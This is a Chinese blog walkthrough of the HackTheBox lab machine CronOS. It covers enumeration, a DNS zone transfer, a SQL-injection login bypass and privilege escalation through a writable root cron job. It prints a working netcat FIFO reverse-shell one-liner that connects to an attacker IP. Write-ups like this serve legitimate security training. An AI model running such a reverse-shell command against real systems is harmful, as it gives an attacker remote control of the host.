> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/jihcZS5IrOFIKzjZ09PVSQ)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **98** 篇文章，本公众号会每日分享攻防渗透技术给大家。

  

靶机地址：https://www.hackthebox.eu/home/machines/profile/11

靶机难度：初级（4.5/10）

靶机发布日期：2017 年 10 月 13 日

靶机描述：

CronOS focuses mainly on different vectors for enumeration and also emphasises the risks associated with adding world-writable files to the root crontab. This machine also includes an introductory-level SQL injection vulnerability.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/1prMbIpCa3humOrLAChJmsjMl4Kxia7vzrQE59ny2bGibWz5Cr8YzNvia9NXzt8O2jiclnVwHYxubpFU1Q6dX9FRCQ/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/5PYA1G5YGGkjAN1M3sw2tjaT2EzjYhfiax6biaK6IUQxeAFY5cgZQtGqXrMp1oRbNic8EDqpxsg5BjArxBhibLM5XQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPSfLdicufnaoLTaicoZY8N9vnlB7ClKQLDcYPFicibhNb8L5FUh5tljySVKicFichHhCn6fibeWJicZniaqHg/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.13....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPSfLdicufnaoLTaicoZY8N9v5icWKWpPX5tNbuibPVzOJTwjX6NJlTlicWiaicwCFQOKZ29NBOPXibHMs6EA/640?wx_fmt=png)

Nmap 发现了一个 OpenSSH 服务器，一个 DNS 服务器和一个 Apache 服务器...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPSfLdicufnaoLTaicoZY8N9vM15mdhZicF2icuHcFBpsksjFrhg2RnDVqfyjSsU0tgfq7AJQj6psHuCg/640?wx_fmt=png)

这里应该是存在子域名信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPSfLdicufnaoLTaicoZY8N9vwUiaPicA85CduItic4fIslPGkson8dZj3j4d7jpQLp9enb6fMEOs6xKAA/640?wx_fmt=png)

尽管必须猜测初始域名 cronos.htb，可以通过进行区域传输来枚举其余的子域，将 cronos.htb 添加到 / etc/hosts 文件后，使用 dig 发现了 admin.... 域名... 继续添加即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPSfLdicufnaoLTaicoZY8N9vhiaAxke8tqGUlslrdZWGppibsiap5NuxXdZNjICnKnUb4zWibm9hliaavOw/640?wx_fmt=png)

通过获得的子域名，添加到 hosts 后，访问是登陆页面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPSfLdicufnaoLTaicoZY8N9vONYfJ1sP8wroJibX6ic9XflNujceuc7rXTmPET9HsB7IHfxq3o3rOJ8A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPSfLdicufnaoLTaicoZY8N9vc4vLH70me3jYEcewW9wgpiaNBZP9Ypibzcsx97RsCCjvCn4t6mA1ESCg/640?wx_fmt=png)

通过测试... 存在 sql 注入... 简单的注入登陆进来了... 是一个 cmd 类似的命令框架... 这就直接提权即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPSfLdicufnaoLTaicoZY8N9vZjynZiaMINVmB5Zfb8f0OP2qt2siaCJka7RZLWCLUTRg5C7Jbtf07x3Q/640?wx_fmt=png)

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.51 4444 >/tmp/f
```

直接一句话提权输入... 获得了低权 shell，成功获得 user 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPSfLdicufnaoLTaicoZY8N9vwmPV7rkcYh8kw6VaOv6fesGDY0vTTXf7p15BrY3bUFul3Me1z3VtzA/640?wx_fmt=png)

利用 https://github.com/rebootuser/LinEnum 工具上传枚举 linux 服务器所有信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPSfLdicufnaoLTaicoZY8N9vMJR7afqYb5ECxs5DLVyZv1wKSvwAkB0wy9vs1C7fPTgfT7qlI20Qhg/640?wx_fmt=png)

通过集体枚举，查看到 crontab 每分钟以 root 身份执行 / var/www/laravel/artisan... 并且进入查看后具有写入等功能...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPSfLdicufnaoLTaicoZY8N9vZXuunYRZiam7KlFQibE2280obE7gHncbsHNgdb3YiaqgdpjQVfCIOmEZQ/640?wx_fmt=png)

这里我直接利用 kali 自导的 shell 覆盖提权.. 成功获得了 root 信息...（常规操作）

或者还可以 echo 写入 shell 命令，等等方式提权，随便怎么弄...

  

当然还可以在 / var/www/admin/config 里头查看到 mysql 账号密码... 通过访问数据库获得 admin 的哈希密码... 爆破即可... 需要时间....

由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台简单的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)